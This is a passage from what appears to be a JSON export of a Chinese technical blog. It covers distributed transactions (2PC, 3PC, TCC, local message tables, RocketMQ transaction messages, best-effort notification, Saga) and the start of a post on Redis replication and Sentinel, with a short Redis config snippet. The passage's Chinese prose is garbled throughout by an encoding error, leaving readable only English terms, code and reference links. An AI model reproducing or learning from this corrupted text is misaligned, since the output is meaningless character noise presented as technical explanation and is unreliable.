\n\nåœ¨å¼‚æ­¥ç¯å¢ƒ(asynchronous)å¹¶ä¸”æ²¡æœ‰èŠ‚ç‚¹å®•æœº(fail-stop)çš„æ¨¡å‹ä¸‹ï¼Œ2PCå¯ä»¥æ»¡è¶³å…¨è®¤åŒã€å€¼åˆæ³•ã€å¯ç»“æŸï¼Œæ˜¯è§£å†³ä¸€è‡´æ€§é—®é¢˜çš„ä¸€ç§åè®®ã€‚\n\n\n\n**å¯èƒ½ä¼šå­˜åœ¨å“ªäº›é—®é¢˜ï¼Ÿ**\n\n- **ã€Œå•ç‚¹æ•…éšœã€**ï¼šä¸€æ—¦äº‹åŠ¡ç®¡ç†å™¨å‡ºç°æ•…éšœï¼Œæ•´ä¸ªç³»ç»Ÿä¸å¯ç”¨\n- **ã€Œæ•°æ®ä¸ä¸€è‡´ã€**ï¼šåœ¨é˜¶æ®µäºŒï¼Œå¦‚æœäº‹åŠ¡ç®¡ç†å™¨åªå‘é€äº†éƒ¨åˆ† commit æ¶ˆæ¯ï¼Œæ­¤æ—¶ç½‘ç»œå‘ç”Ÿå¼‚å¸¸ï¼Œé‚£ä¹ˆåªæœ‰éƒ¨åˆ†å‚ä¸è€…æ¥æ”¶åˆ° commit æ¶ˆæ¯ï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰éƒ¨åˆ†å‚ä¸è€…æäº¤äº†äº‹åŠ¡ï¼Œä½¿å¾—ç³»ç»Ÿæ•°æ®ä¸ä¸€è‡´ã€‚\n- **ã€Œå“åº”æ—¶é—´è¾ƒé•¿ã€**ï¼šæ•´ä¸ªæ¶ˆæ¯é“¾è·¯æ˜¯ä¸²è¡Œçš„ï¼Œè¦ç­‰å¾…å“åº”ç»“æœï¼Œä¸é€‚åˆé«˜å¹¶å‘çš„åœºæ™¯\n- **ã€Œä¸ç¡®å®šæ€§ã€**ï¼šå½“äº‹åŠ¡ç®¡ç†å™¨å‘é€ commit ä¹‹åï¼Œå¹¶ä¸”æ­¤æ—¶åªæœ‰ä¸€ä¸ªå‚ä¸è€…æ”¶åˆ°äº† commitï¼Œé‚£ä¹ˆå½“è¯¥å‚ä¸è€…ä¸äº‹åŠ¡ç®¡ç†å™¨åŒæ—¶å®•æœºä¹‹åï¼Œé‡æ–°é€‰ä¸¾çš„äº‹åŠ¡ç®¡ç†å™¨æ— æ³•ç¡®å®šè¯¥æ¡æ¶ˆæ¯æ˜¯å¦æäº¤æˆåŠŸã€‚\n\n### 1.2 3PC(three phase commit)\n\n3PC(three phase commit)å³ä¸‰é˜¶æ®µæäº¤ã€‚ç›¸å¯¹äº2PCæ¥è¯´å¢åŠ äº†CanCommité˜¶æ®µå’Œè¶…æ—¶æœºåˆ¶ã€‚å¦‚æœæ®µæ—¶é—´å†…æ²¡æœ‰æ”¶åˆ°åè°ƒè€…çš„commitè¯·æ±‚ï¼Œé‚£ä¹ˆå°±ä¼šè‡ªåŠ¨è¿›è¡Œcommitï¼Œè§£å†³äº†2PCå•ç‚¹æ•…éšœçš„é—®é¢˜ã€‚\n\n<img src=\"åˆ†å¸ƒå¼ä¸€è‡´æ€§è§£å†³æ–¹æ¡ˆ/81875376-AFEA-4A0C-9770-958FEFD27509.png\" alt=\"f2f443bf6560482a3a4dd3eeb002bedb\" style=\"zoom:150%;\" />\n\n- ç¬¬ä¸€é˜¶æ®µï¼šã€ŒCanCommité˜¶æ®µã€\n\n  è¿™ä¸ªé˜¶æ®µæ‰€åšçš„äº‹å¾ˆç®€å•ï¼Œå°±æ˜¯åè°ƒè€…è¯¢é—®äº‹åŠ¡å‚ä¸è€…ï¼Œä½ æ˜¯å¦æœ‰èƒ½åŠ›å®Œæˆæ­¤æ¬¡äº‹åŠ¡ã€‚\n\n  - å¦‚æœéƒ½è¿”å›yesï¼Œåˆ™è¿›å…¥ç¬¬äºŒé˜¶æ®µ\n  - æœ‰ä¸€ä¸ªè¿”å›noæˆ–ç­‰å¾…å“åº”è¶…æ—¶ï¼Œåˆ™ä¸­æ–­äº‹åŠ¡ï¼Œå¹¶å‘æ‰€æœ‰å‚ä¸è€…å‘é€abortè¯·æ±‚\n\n- ç¬¬äºŒé˜¶æ®µï¼šã€ŒPreCommité˜¶æ®µã€\n\n  æ­¤æ—¶åè°ƒè€…ä¼šå‘æ‰€æœ‰çš„å‚ä¸è€…å‘é€PreCommitè¯·æ±‚ï¼Œå‚ä¸è€…æ”¶åˆ°åå¼€å§‹æ‰§è¡Œäº‹åŠ¡æ“ä½œï¼Œå¹¶å°†Undoå’ŒRedoä¿¡æ¯è®°å½•åˆ°äº‹åŠ¡æ—¥å¿—ä¸­ã€‚å‚ä¸è€…æ‰§è¡Œå®Œäº‹åŠ¡æ“ä½œåï¼ˆæ­¤æ—¶å±äºæœªæäº¤äº‹åŠ¡çš„çŠ¶æ€ï¼‰ï¼Œå°±ä¼šå‘åè°ƒè€…åé¦ˆâ€œAckâ€è¡¨ç¤ºæˆ‘å·²ç»å‡†å¤‡å¥½æäº¤äº†ï¼Œå¹¶ç­‰å¾…åè°ƒè€…çš„ä¸‹ä¸€æ­¥æŒ‡ä»¤ã€‚\n\n- ç¬¬ä¸‰é˜¶æ®µï¼šã€ŒDoCommité˜¶æ®µã€\n\n  åœ¨é˜¶æ®µäºŒä¸­å¦‚æœæ‰€æœ‰çš„å‚ä¸è€…èŠ‚ç‚¹éƒ½å¯ä»¥è¿›è¡ŒPreCommitæäº¤ï¼Œé‚£ä¹ˆåè°ƒè€…å°±ä¼šä»â€œé¢„æäº¤çŠ¶æ€â€è½¬å˜ä¸ºâ€œæäº¤çŠ¶æ€â€ã€‚ç„¶åå‘æ‰€æœ‰çš„å‚ä¸è€…èŠ‚ç‚¹å‘é€\"doCommit\"è¯·æ±‚ï¼Œå‚ä¸è€…èŠ‚ç‚¹åœ¨æ”¶åˆ°æäº¤è¯·æ±‚åå°±ä¼šå„è‡ªæ‰§è¡Œäº‹åŠ¡æäº¤æ“ä½œï¼Œå¹¶å‘åè°ƒè€…èŠ‚ç‚¹åé¦ˆâ€œAckâ€æ¶ˆæ¯ï¼Œåè°ƒè€…æ”¶åˆ°æ‰€æœ‰å‚ä¸è€…çš„Ackæ¶ˆæ¯åå®Œæˆäº‹åŠ¡ã€‚ç›¸åï¼Œå¦‚æœæœ‰ä¸€ä¸ªå‚ä¸è€…èŠ‚ç‚¹æœªå®ŒæˆPreCommitçš„åé¦ˆæˆ–è€…åé¦ˆè¶…æ—¶ï¼Œé‚£ä¹ˆåè°ƒè€…éƒ½ä¼šå‘æ‰€æœ‰çš„å‚ä¸è€…èŠ‚ç‚¹å‘é€abortè¯·æ±‚ï¼Œä»è€Œä¸­æ–­äº‹åŠ¡ã€‚\n\n\n\n**participantå¦‚æœåœ¨ä¸åŒé˜¶æ®µå®•æœºï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹3PCå¦‚ä½•åº”å¯¹ï¼š**\n\n- é˜¶æ®µ1: coordinatoræˆ–watchdogæœªæ”¶åˆ°å®•æœºparticipantçš„voteï¼Œç›´æ¥ä¸­æ­¢äº‹åŠ¡ï¼›å®•æœºçš„participantæ¢å¤åï¼Œè¯»å–loggingå‘ç°æœªå‘å‡ºèµæˆvoteï¼Œè‡ªè¡Œä¸­æ­¢è¯¥æ¬¡äº‹åŠ¡\n- é˜¶æ®µ2: coordinatoræœªæ”¶åˆ°å®•æœºparticipantçš„precommit ACKï¼Œä½†å› ä¸ºä¹‹å‰å·²ç»æ”¶åˆ°äº†å®•æœºparticipantçš„èµæˆåé¦ˆ(ä¸ç„¶ä¹Ÿä¸ä¼šè¿›å…¥åˆ°é˜¶æ®µ2)ï¼Œcoordinatorè¿›è¡Œcommitï¼›watchdogå¯ä»¥é€šè¿‡é—®è¯¢å…¶ä»–participantè·å¾—è¿™äº›ä¿¡æ¯ï¼Œè¿‡ç¨‹åŒç†ï¼›å®•æœºçš„participantæ¢å¤åå‘ç°æ”¶åˆ°precommitæˆ–å·²ç»å‘å‡ºèµæˆvoteï¼Œåˆ™è‡ªè¡Œcommitè¯¥æ¬¡äº‹åŠ¡\n- é˜¶æ®µ3: å³ä¾¿coordinatoræˆ–watchdogæœªæ”¶åˆ°å®•æœºparticipantçš„commit ACKï¼Œä¹Ÿç»“æŸè¯¥æ¬¡äº‹åŠ¡ï¼›å®•æœºçš„participantæ¢å¤åå‘ç°æ”¶åˆ°commitæˆ–è€…precommitï¼Œä¹Ÿå°†è‡ªè¡Œcommitè¯¥æ¬¡äº‹åŠ¡\n\n\n\nå› ä¸ºæœ‰äº†å‡†å¤‡æäº¤(prepare to commit)é˜¶æ®µï¼Œ3PCçš„äº‹åŠ¡å¤„ç†å»¶æ—¶ä¹Ÿå¢åŠ äº†1ä¸ªRTTï¼Œå˜ä¸º3ä¸ªRTT(propose+precommit+commit)ï¼Œä½†æ˜¯å®ƒé˜²æ­¢participantå®•æœºåæ•´ä¸ªç³»ç»Ÿè¿›å…¥é˜»å¡æ€ï¼Œå¢å¼ºäº†ç³»ç»Ÿçš„å¯ç”¨æ€§ï¼Œå¯¹ä¸€äº›ç°å®ä¸šåŠ¡åœºæ™¯æ˜¯éå¸¸å€¼å¾—çš„ã€‚\n\n# 2. æŸ”æ€§äº‹åŠ¡æ–¹æ¡ˆ\n\n### 2.1 TCC è¡¥å¿\n\nTCCï¼ˆTry-Confirm-Cancelï¼‰åˆè¢«ç§°è¡¥å¿äº‹åŠ¡ï¼ŒTCCä¸2PCçš„æ€æƒ³å¾ˆç›¸ä¼¼ï¼Œäº‹åŠ¡å¤„ç†æµç¨‹ä¹Ÿå¾ˆç›¸ä¼¼ï¼Œä½†**2PCæ˜¯åº”ç”¨äºåœ¨DBå±‚é¢ï¼ŒTCCåˆ™å¯ä»¥ç†è§£ä¸ºåœ¨åº”ç”¨å±‚é¢çš„2PCï¼Œæ˜¯éœ€è¦æˆ‘ä»¬ç¼–å†™ä¸šåŠ¡é€»è¾‘æ¥å®ç°**ã€‚\n\nTCCå®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š\"é’ˆå¯¹æ¯ä¸ªæ“ä½œéƒ½è¦æ³¨å†Œä¸€ä¸ªä¸å…¶å¯¹åº”çš„ç¡®è®¤ï¼ˆTryï¼‰å’Œè¡¥å¿ï¼ˆCancelï¼‰\"ã€‚å®ƒåˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼šTry,Confirm,Cancel\n\nTryé˜¶æ®µæ‰§è¡ŒæˆåŠŸå¹¶å¼€å§‹æ‰§è¡Œ Confirmé˜¶æ®µæ—¶ï¼Œé»˜è®¤ Confirmé˜¶æ®µæ˜¯ä¸ä¼šå‡ºé”™çš„ã€‚å³ï¼šåªè¦TryæˆåŠŸï¼ŒConfirmä¸€å®šæˆåŠŸã€‚\n\n<img src=\"åˆ†å¸ƒå¼ä¸€è‡´æ€§è§£å†³æ–¹æ¡ˆ/s6k4jk82zh.png\" alt=\"img\" style=\"zoom:67%;\" />\n\nTCC äº‹åŠ¡æœºåˆ¶ç›¸æ¯”äºä¸Šé¢ä»‹ç»çš„2PCï¼Œè§£å†³äº†å…¶å‡ ä¸ªç¼ºç‚¹ï¼š\n\n- 1.**ã€Œè§£å†³äº†åè°ƒè€…å•ç‚¹ã€**ï¼Œç”±ä¸»ä¸šåŠ¡æ–¹å‘èµ·å¹¶å®Œæˆè¿™ä¸ªä¸šåŠ¡æ´»åŠ¨ã€‚ä¸šåŠ¡æ´»åŠ¨ç®¡ç†å™¨ä¹Ÿå˜æˆå¤šç‚¹ï¼Œå¼•å…¥é›†ç¾¤ã€‚\n- 2.**ã€ŒåŒæ­¥é˜»å¡ã€**ï¼šå¼•å…¥è¶…æ—¶ï¼Œè¶…æ—¶åè¿›è¡Œè¡¥å¿ï¼Œå¹¶ä¸”ä¸ä¼šé”å®šæ•´ä¸ªèµ„æºï¼Œå°†èµ„æºè½¬æ¢ä¸ºä¸šåŠ¡é€»è¾‘å½¢å¼ï¼Œç²’åº¦å˜å°ã€‚\n- 3.**ã€Œæ•°æ®ä¸€è‡´æ€§ã€**ï¼Œæœ‰äº†è¡¥å¿æœºåˆ¶ä¹‹åï¼Œç”±ä¸šåŠ¡æ´»åŠ¨ç®¡ç†å™¨æ§åˆ¶ä¸€è‡´æ€§ã€‚\n\næ€»ä¹‹ï¼ŒTCC å°±æ˜¯é€šè¿‡ä»£ç äººä¸ºå®ç°äº†ä¸¤é˜¶æ®µæäº¤ï¼Œä¸åŒçš„ä¸šåŠ¡åœºæ™¯æ‰€å†™çš„ä»£ç éƒ½ä¸ä¸€æ ·ï¼Œå¹¶ä¸”å¾ˆå¤§ç¨‹åº¦çš„**ã€Œå¢åŠ ã€**äº†ä¸šåŠ¡ä»£ç çš„**ã€Œå¤æ‚åº¦ã€**ï¼Œå› æ­¤ï¼Œè¿™ç§æ¨¡å¼å¹¶ä¸èƒ½å¾ˆå¥½åœ°è¢«å¤ç”¨ã€‚\n\n### 2.2 æœ¬åœ°æ¶ˆæ¯è¡¨\n\n<img src=\"åˆ†å¸ƒå¼ä¸€è‡´æ€§è§£å†³æ–¹æ¡ˆ/bVcTlFE.png\" alt=\"image.png\" style=\"zoom:50%;\" />\n\nå†™æœ¬åœ°æ¶ˆæ¯å’Œä¸šåŠ¡æ“ä½œæ”¾åœ¨ä¸€ä¸ªäº‹åŠ¡é‡Œï¼Œä¿è¯äº†ä¸šåŠ¡å’Œå‘æ¶ˆæ¯çš„åŸå­æ€§ï¼Œè¦ä¹ˆä»–ä»¬å…¨éƒ½æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ½å¤±è´¥ã€‚\n\nå®¹é”™æœºåˆ¶ï¼š\n\n- æ‰£å‡ä½™é¢äº‹åŠ¡ å¤±è´¥æ—¶ï¼Œäº‹åŠ¡ç›´æ¥å›æ»šï¼Œæ— åç»­æ­¥éª¤\n- è½®åºç”Ÿäº§æ¶ˆæ¯å¤±è´¥ï¼Œ å¢åŠ ä½™é¢äº‹åŠ¡å¤±è´¥éƒ½ä¼šè¿›è¡Œé‡è¯•\n\næœ¬åœ°æ¶ˆæ¯è¡¨çš„ç‰¹ç‚¹ï¼š\n\n- ä¸æ”¯æŒå›æ»š\n- è½®è¯¢ç”Ÿäº§æ¶ˆæ¯éš¾å®ç°ï¼Œå¦‚æœå®šæ—¶è½®è¯¢ä¼šå»¶é•¿äº‹åŠ¡æ€»æ—¶é•¿ï¼Œå¦‚æœè®¢é˜…binlogåˆ™å¼€å‘ç»´æŠ¤å›°éš¾\n\né€‚ç”¨äºå¯å¼‚æ­¥æ‰§è¡Œçš„ä¸šåŠ¡ï¼Œä¸”åç»­æ“ä½œæ— éœ€å›æ»šçš„ä¸šåŠ¡\n\n### 2.3 äº‹åŠ¡æ¶ˆæ¯\n\nåœ¨ä¸Šè¿°çš„æœ¬åœ°æ¶ˆæ¯è¡¨æ–¹æ¡ˆä¸­ï¼Œç”Ÿäº§è€…éœ€è¦é¢å¤–åˆ›å»ºæ¶ˆæ¯è¡¨ï¼Œè¿˜éœ€è¦å¯¹æœ¬åœ°æ¶ˆæ¯è¡¨è¿›è¡Œè½®è¯¢ï¼Œä¸šåŠ¡è´Ÿæ‹…è¾ƒé‡ã€‚é˜¿é‡Œå¼€æºçš„RocketMQ 4.3ä¹‹åçš„ç‰ˆæœ¬æ­£å¼æ”¯æŒäº‹åŠ¡æ¶ˆæ¯ï¼Œè¯¥äº‹åŠ¡æ¶ˆæ¯æœ¬è´¨ä¸Šæ˜¯æŠŠæœ¬åœ°æ¶ˆæ¯è¡¨æ”¾åˆ°RocketMQä¸Šï¼Œè§£å†³ç”Ÿäº§ç«¯çš„æ¶ˆæ¯å‘é€ä¸æœ¬åœ°äº‹åŠ¡æ‰§è¡Œçš„åŸå­æ€§é—®é¢˜ã€‚\n\näº‹åŠ¡æ¶ˆæ¯å‘é€åŠæäº¤ï¼š\n\n- å‘é€æ¶ˆæ¯ï¼ˆhalfæ¶ˆæ¯ï¼‰\n- æœåŠ¡ç«¯å­˜å‚¨æ¶ˆæ¯ï¼Œå¹¶å“åº”æ¶ˆæ¯çš„å†™å…¥ç»“æœ\n- æ ¹æ®å‘é€ç»“æœæ‰§è¡Œæœ¬åœ°äº‹åŠ¡ï¼ˆå¦‚æœå†™å…¥å¤±è´¥ï¼Œæ­¤æ—¶halfæ¶ˆæ¯å¯¹ä¸šåŠ¡ä¸å¯è§ï¼Œæœ¬åœ°é€»è¾‘ä¸æ‰§è¡Œï¼‰\n- æ ¹æ®æœ¬åœ°äº‹åŠ¡çŠ¶æ€æ‰§è¡ŒCommitæˆ–è€…Rollbackï¼ˆCommitæ“ä½œå‘å¸ƒæ¶ˆæ¯ï¼Œæ¶ˆæ¯å¯¹æ¶ˆè´¹è€…å¯è§ï¼‰\n\n<img src=\"åˆ†å¸ƒå¼ä¸€è‡´æ€§è§£å†³æ–¹æ¡ˆ/bVcXNbU.png\" alt=\"image.png\" style=\"zoom:60%;\" />\n\n\n\n\n\n### 2.4 æœ€å¤§åŠªåŠ›é€šçŸ¥\n\næœ€å¤§åŠªåŠ›é€šçŸ¥çš„æ–¹æ¡ˆå®ç°æ¯”è¾ƒç®€å•ï¼Œé€‚ç”¨äºä¸€äº›æœ€ç»ˆä¸€è‡´æ€§è¦æ±‚è¾ƒä½çš„ä¸šåŠ¡ã€‚\n\næ‰§è¡Œæµç¨‹ï¼š\n\n- ç³»ç»Ÿ A æœ¬åœ°äº‹åŠ¡æ‰§è¡Œå®Œä¹‹åï¼Œå‘é€ä¸ªæ¶ˆæ¯åˆ° MQï¼›\n- è¿™é‡Œä¼šæœ‰ä¸ªä¸“é—¨æ¶ˆè´¹ MQ çš„æœåŠ¡ï¼Œè¿™ä¸ªæœåŠ¡ä¼šæ¶ˆè´¹ MQ å¹¶è°ƒç”¨ç³»ç»Ÿ B çš„æ¥å£ï¼›\n- è¦æ˜¯ç³»ç»Ÿ B æ‰§è¡ŒæˆåŠŸå°± ok äº†ï¼›è¦æ˜¯ç³»ç»Ÿ B æ‰§è¡Œå¤±è´¥äº†ï¼Œé‚£ä¹ˆæœ€å¤§åŠªåŠ›é€šçŸ¥æœåŠ¡å°±å®šæ—¶å°è¯•é‡æ–°è°ƒç”¨ç³»ç»Ÿ B, åå¤ N æ¬¡ï¼Œæœ€åè¿˜æ˜¯ä¸è¡Œå°±æ”¾å¼ƒã€‚\n\n### 2.5 Saga\n\nå°†é•¿äº‹åŠ¡æ‹†åˆ†ä¸ºå¤šä¸ªçŸ­äº‹åŠ¡ï¼Œç”± Saga äº‹åŠ¡åè°ƒå™¨åè°ƒï¼Œå¦‚æœæ¯ä¸ªçŸ­äº‹åŠ¡éƒ½æˆåŠŸæäº¤å®Œæˆï¼Œé‚£ä¹ˆå…¨å±€äº‹åŠ¡å°±æ­£å¸¸å®Œæˆï¼Œå¦‚æœæŸä¸ªæ­¥éª¤å¤±è´¥ï¼Œåˆ™æ ¹æ®ç›¸åé¡ºåºä¸€æ¬¡è°ƒç”¨è¡¥å¿æ“ä½œã€‚\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://github.com/wangzhiwubigdata/God-Of-BigData\n\n+ https://www.bilibili.com/video/BV1TW411M7Fx\n\n+ https://seata.io/zh-cn/blog/seata-at-tcc-saga.html\n\n+ https://segmentfault.com/a/1190000040321750\n\n+ http://thesecretlivesofdata.com/raft/\n\n+ https://pdai.tech/md/arch/arch-z-transection.html\n\n+ https://github.com/dtm-labs/dtm","tags":["åˆ†å¸ƒå¼"],"categories":["åˆ†å¸ƒå¼"]},{"title":"redisä¸»ä»å¤åˆ¶å’Œå“¨å…µé›†ç¾¤","url":"%2Fp%2F68fa54c2.html","content":"\n# 1. ä¸»ä»å¤åˆ¶\n\nä¸»ä»å¤åˆ¶ï¼Œæ˜¯æŒ‡å°†ä¸€å°RedisæœåŠ¡å™¨çš„æ•°æ®ï¼Œå¤åˆ¶åˆ°å…¶ä»–çš„RedisæœåŠ¡å™¨ã€‚å‰è€…ç§°ä¸ºä¸»èŠ‚ç‚¹(master)ï¼Œåè€…ç§°ä¸ºä»èŠ‚ç‚¹(slave)ï¼›æ•°æ®çš„å¤åˆ¶æ˜¯å•å‘çš„ï¼Œåªèƒ½ç”±ä¸»èŠ‚ç‚¹åˆ°ä»èŠ‚ç‚¹ã€‚\n\n<!-- more -->\n\n### 1.1 ä½œç”¨\n\nä¸»ä»å¤åˆ¶çš„ä½œç”¨ä¸»è¦åŒ…æ‹¬ï¼š\n\n- æ•°æ®å†—ä½™ï¼šä¸»ä»å¤åˆ¶å®ç°äº†æ•°æ®çš„çƒ­å¤‡ä»½ï¼Œæ˜¯æŒä¹…åŒ–ä¹‹å¤–çš„ä¸€ç§æ•°æ®å†—ä½™æ–¹å¼ã€‚\n- æ•…éšœæ¢å¤ï¼šå½“ä¸»èŠ‚ç‚¹å‡ºç°é—®é¢˜æ—¶ï¼Œå¯ä»¥ç”±ä»èŠ‚ç‚¹æä¾›æœåŠ¡ï¼Œå®ç°å¿«é€Ÿçš„æ•…éšœæ¢å¤ï¼›å®é™…ä¸Šæ˜¯ä¸€ç§æœåŠ¡çš„å†—ä½™ã€‚\n- è´Ÿè½½å‡è¡¡ï¼šåœ¨ä¸»ä»å¤åˆ¶çš„åŸºç¡€ä¸Šï¼Œé…åˆè¯»å†™åˆ†ç¦»ï¼Œå¯ä»¥ç”±ä¸»èŠ‚ç‚¹æä¾›å†™æœåŠ¡ï¼Œç”±ä»èŠ‚ç‚¹æä¾›è¯»æœåŠ¡ï¼ˆå³å†™Redisæ•°æ®æ—¶åº”ç”¨è¿æ¥ä¸»èŠ‚ç‚¹ï¼Œè¯»Redisæ•°æ®æ—¶åº”ç”¨è¿æ¥ä»èŠ‚ç‚¹ï¼‰ï¼Œåˆ†æ‹…æœåŠ¡å™¨è´Ÿè½½ï¼›å°¤å…¶æ˜¯åœ¨å†™å°‘è¯»å¤šçš„åœºæ™¯ä¸‹ï¼Œé€šè¿‡å¤šä¸ªä»èŠ‚ç‚¹åˆ†æ‹…è¯»è´Ÿè½½ï¼Œå¯ä»¥å¤§å¤§æé«˜RedisæœåŠ¡å™¨çš„å¹¶å‘é‡ã€‚\n- é«˜å¯ç”¨åŸºçŸ³ï¼šé™¤äº†ä¸Šè¿°ä½œç”¨ä»¥å¤–ï¼Œä¸»ä»å¤åˆ¶è¿˜æ˜¯å“¨å…µå’Œé›†ç¾¤èƒ½å¤Ÿå®æ–½çš„åŸºç¡€ï¼Œå› æ­¤è¯´ä¸»ä»å¤åˆ¶æ˜¯Redisé«˜å¯ç”¨çš„åŸºç¡€ã€‚\n\n### 1.2 å…¨é‡å¤åˆ¶\n\næ³¨æ„ï¼šåœ¨2.8ç‰ˆæœ¬ä¹‹å‰åªæœ‰å…¨é‡å¤åˆ¶ï¼Œè€Œ2.8ç‰ˆæœ¬åæœ‰å…¨é‡å’Œå¢é‡å¤åˆ¶ï¼š\n\n\n\n<img src=\"redisä¸»ä»å¤åˆ¶å’Œå“¨å…µé›†ç¾¤/image-20230831114442450.png\" alt=\"image-20230831114442450\" style=\"zoom:50%;\" />\n\n**ç¬¬ä¸€é˜¶æ®µæ˜¯ä¸»ä»åº“é—´å»ºç«‹è¿æ¥ã€åå•†åŒæ­¥çš„è¿‡ç¨‹**\n\n+ ä»åº“ç»™ä¸»åº“å‘é€ psync å‘½ä»¤ï¼Œè¡¨ç¤ºè¦è¿›è¡Œæ•°æ®åŒæ­¥ï¼Œä¸»åº“æ ¹æ®è¿™ä¸ªå‘½ä»¤çš„å‚æ•°æ¥å¯åŠ¨å¤åˆ¶ã€‚\n+ ä¸»åº“æ”¶åˆ° psync å‘½ä»¤åï¼Œä¼šç”¨ FULLRESYNC å“åº”å‘½ä»¤å¸¦ä¸Šä¸¤ä¸ªå‚æ•°ï¼šä¸»åº“ runID å’Œä¸»åº“ç›®å‰çš„å¤åˆ¶è¿›åº¦ offsetï¼Œè¿”å›ç»™ä»åº“ã€‚FULLRESYNC å“åº”è¡¨ç¤ºç¬¬ä¸€æ¬¡å¤åˆ¶é‡‡ç”¨çš„å…¨é‡å¤åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸»åº“ä¼šæŠŠå½“å‰æ‰€æœ‰çš„æ•°æ®éƒ½å¤åˆ¶ç»™ä»åº“ã€‚\n\n**ç¬¬äºŒé˜¶æ®µï¼Œä¸»åº“å°†æ‰€æœ‰æ•°æ®åŒæ­¥ç»™ä»åº“**ã€‚\n\n+ ä¸»åº“æ‰§è¡Œ bgsave å‘½ä»¤ï¼Œç”Ÿæˆ RDB æ–‡ä»¶ï¼Œæ¥ç€å°†æ–‡ä»¶å‘ç»™ä»åº“ã€‚ä»åº“æ¥æ”¶åˆ° RDB æ–‡ä»¶åï¼Œä¼šå…ˆæ¸…ç©ºå½“å‰æ•°æ®åº“ï¼Œç„¶ååŠ è½½ RDB æ–‡ä»¶ã€‚\n\n**ç¬¬ä¸‰ä¸ªé˜¶æ®µï¼Œä¸»åº“ä¼šæŠŠç¬¬äºŒé˜¶æ®µæ‰§è¡Œè¿‡ç¨‹ä¸­æ–°æ”¶åˆ°çš„å†™å‘½ä»¤ï¼Œå†å‘é€ç»™ä»åº“**ã€‚\n\n+ å½“ä¸»åº“å®Œæˆ RDB æ–‡ä»¶å‘é€åï¼Œå°±ä¼šæŠŠæ­¤æ—¶ replication buffer ä¸­çš„ä¿®æ”¹æ“ä½œå‘ç»™ä»åº“ï¼Œä»åº“å†é‡æ–°æ‰§è¡Œè¿™äº›æ“ä½œã€‚è¿™æ ·ä¸€æ¥ï¼Œä¸»ä»åº“å°±å®ç°åŒæ­¥äº†ã€‚\n\n##### é…ç½®\n\n```bash\n# ä¸»redisé…ç½®, æ— éœ€ç‰¹æ®Šé…ç½®, å› ä¸ºåœ¨ docker å†…, éœ€è¦ä¿®æ”¹ä¸€ä¸‹bind\nvi $PWD/redis1/redis.conf\nbind 127.0.0.1 æ”¹ä¸º bind 0.0.0.0\n\n# ä¿®æ”¹ä»redisé…ç½®, ä¿®æ”¹ redis.conf æ–‡ä»¶\nvi $PWD/redis2/redis.conf\nslaveof 172.17.0.1 63791\n```\n\n\n\n### 1.3 å¢é‡å¤åˆ¶\n\n> åœ¨ Redis 2.8 ç‰ˆæœ¬å¼•å…¥äº†å¢é‡å¤åˆ¶ã€‚\n\n \n\n<img src=\"redisä¸»ä»å¤åˆ¶å’Œå“¨å…µé›†ç¾¤/image-20230831115201039.png\" alt=\"image-20230831115201039\" style=\"zoom:50%;\" />\n\nå½“ä¸»æœåŠ¡å™¨è¿›è¡Œå‘½ä»¤ä¼ æ’­çš„æ—¶å€™ï¼Œmaserä¸ä»…å°†æ‰€æœ‰çš„æ•°æ®æ›´æ–°å‘½ä»¤å‘é€åˆ°æ‰€æœ‰slaveçš„replication bufferï¼Œè¿˜ä¼šå†™å…¥replication backlogã€‚\n\nå½“æ–­å¼€çš„slaveé‡æ–°è¿æ¥ä¸Šmasterçš„æ—¶å€™ï¼Œslaveå°†ä¼šå‘é€psyncå‘½ä»¤ï¼ˆåŒ…å«å¤åˆ¶çš„åç§»é‡offsetï¼‰ï¼Œè¯·æ±‚partial resyncã€‚å¦‚æœè¯·æ±‚çš„offsetä¸å­˜åœ¨ï¼Œé‚£ä¹ˆæ‰§è¡Œå…¨é‡çš„syncæ“ä½œï¼Œç›¸å½“äºé‡æ–°å»ºç«‹ä¸»ä»å¤åˆ¶ã€‚\n\n##### repl backlog buffer\n\nä¸€ä¸ªä¸»åº“åªåˆ†é…ä¸€ä¸ªrepl backlogï¼Œ æ˜¯åœ¨å¢é‡å¤åˆ¶é˜¶æ®µå‡ºç°ã€‚\n\nå®ƒæ˜¯ä¸ºäº†ä»åº“æ–­å¼€ä¹‹åï¼Œå¦‚ä½•æ‰¾åˆ°ä¸»ä»å·®å¼‚æ•°æ®è€Œè®¾è®¡çš„ç¯å½¢ç¼“å†²åŒºï¼Œå› ä¸ºæ˜¯ç¯å½¢ç»“æ„ï¼Œä¼šç›´æ¥è¦†ç›–èµ·å§‹ä½ç½®æ•°æ®ã€‚å¦‚æœä»åº“æ–­å¼€æ—¶é—´å¤ªä¹…ï¼Œrepl_backlog_bufferç¯å½¢ç¼“å†²åŒºè¢«ä¸»åº“çš„å†™å‘½ä»¤è¦†ç›–äº†ï¼Œé‚£ä¹ˆä»åº“è¿ä¸Šä¸»åº“ååªèƒ½ä¹–ä¹–åœ°è¿›è¡Œä¸€æ¬¡å…¨é‡å¤åˆ¶ã€‚\n\n##### replication buffer\n\n ä¸»åº“ä¼šç»™æ¯ä¸ªæ–°è¿æ¥çš„ä»åº“ï¼Œåˆ†é…ä¸€ä¸ªreplication bufferã€‚\n\nreplication bufferå¯¹åº”äºæ¯ä¸ªslave ã€‚ä»åº“ä¹Ÿæ˜¯ä¸€ä¸ªclientï¼Œæ¯ä¸ªclientè¿ä¸ŠRedisåï¼ŒRediséƒ½ä¼šåˆ†é…ä¸€ä¸ªclient bufferï¼ŒRediså…ˆæŠŠæ•°æ®å†™åˆ°è¿™ä¸ªbufferä¸­ï¼Œç„¶åå†æŠŠbufferä¸­çš„æ•°æ®å‘åˆ°client socketä¸­å†é€šè¿‡ç½‘ç»œå‘é€å‡ºå»ï¼Œè¿™æ ·å°±å®Œæˆäº†æ•°æ®äº¤äº’ã€‚\n\n# 2. å“¨å…µ\n\nRedis Sentinelï¼Œå³Rediså“¨å…µï¼Œåœ¨Redis 2.8ç‰ˆæœ¬å¼€å§‹å¼•å…¥ã€‚å“¨å…µçš„æ 